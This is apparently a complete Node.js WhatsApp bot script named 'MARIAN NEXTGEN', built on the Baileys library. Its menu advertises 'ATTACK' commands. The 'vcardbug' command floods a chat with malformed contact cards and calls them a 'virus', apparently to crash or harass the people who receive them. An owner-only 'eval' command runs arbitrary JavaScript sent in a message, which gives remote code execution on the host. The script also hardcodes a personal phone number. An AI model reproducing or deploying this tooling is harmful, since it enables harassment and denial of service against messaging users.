const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeCacheableSignalKeyStore,
    generateForwardMessageContent, 
    prepareWAMessageMedia, 
    generateWAMessageFromContent, 
    generateMessageID, 
    downloadContentFromMessage, 
    makeInMemoryStore, 
    jidDecode, 
    proto 
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require('fs');
const chalk = require('chalk');
const readline = require("readline");

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function startMarian() {
    const { state, saveCreds } = await useMultiFileAuthState('sessions');
    const { version } = await fetchLatestBaileysVersion();

    const marian = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })),
        },
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    if (!marian.authState.creds.registered) {
        console.log(chalk.red.bold("\n💀 LOGIN MARIAN NEXTGEN - CLOUD ENGINE 💀"));
        let phoneNumber = await question(chalk.yellow('ENTER YOUR PHONE: '));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await marian.requestPairingCode(phoneNumber);
        console.log(chalk.black.bgGreen(`\n[!] KODE PAIRING: ${code}\n`));
    }

    marian.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                startMarian();
            } else {
                process.exit();
            }
        } else if (connection === 'open') {
            console.log(chalk.green.bold("\n[✓] MARIAN ONLINE DI CLOUD!"));
        }
    });

    marian.ev.on('creds.update', saveCreds);

    marian.ev.on('messages.upsert', async chatUpdate => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const type = Object.keys(mek.message)[0];
            const from = mek.key.remoteJid;
            const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : '';
            const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/)[0] : '';
            const isCmd = body.startsWith(prefix);
            const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
            const args = body.trim().split(/ +/).slice(1);
            const text = args.join(" ");

            if (isCmd) {
                switch (command) {
                    case 'menu':
                        let menu = `💀 *MARIAN NEXTGEN* 💀\n\n` +
                                   `*⚡ MAIN:* .ping, .owner\n` +
                                   `*💀 ATTACK:* .vcardbug, .uicrash\n` +
                                   `*📸 TOOLS:* .remini, .sticker\n\n` +
                                   `_Server: Google Cloud_`;
                        await marian.sendMessage(from, { text: menu }, { quoted: mek });
                        break;

                    case 'ping':
                        await marian.sendMessage(from, { text: 'Speed: 0.001ms (Cloud Shell)' }, { quoted: mek });
                        break;

                    case 'owner':
                        const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Kean\nTEL;type=CELL;type=VOICE;waid=601121811615:+601121811615\nEND:VCARD';
                        await marian.sendMessage(from, { contacts: { displayName: 'Kean', contacts: [{ vcard }] } });
                        break;

                    case 'vcardbug':
                        await marian.sendMessage(from, { text: '💀 Sending virus...' });
                        for (let i = 0; i < 5; i++) {
                            let bug = 'BEGIN:VCARD\nVERSION:3.0\nFN:☠️\nTEL;type=CELL;type=VOICE;waid=123:0\nEND:VCARD';
                            await marian.sendMessage(from, { contacts: { displayName: '☣️', contacts: [{ vcard: bug }] } });
                        }
                        break;

                    case 'eval':
                        if (!mek.key.fromMe && from !== '601121811615@s.whatsapp.net') return;
                        try {
                            let evaled = await eval(text);
                            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                            marian.sendMessage(from, { text: evaled }, { quoted: mek });
                        } catch (e) { marian.sendMessage(from, { text: String(e) }); }
                        break;
                }
            }
        } catch (err) { console.log(err); }
    });
}

startMarian();
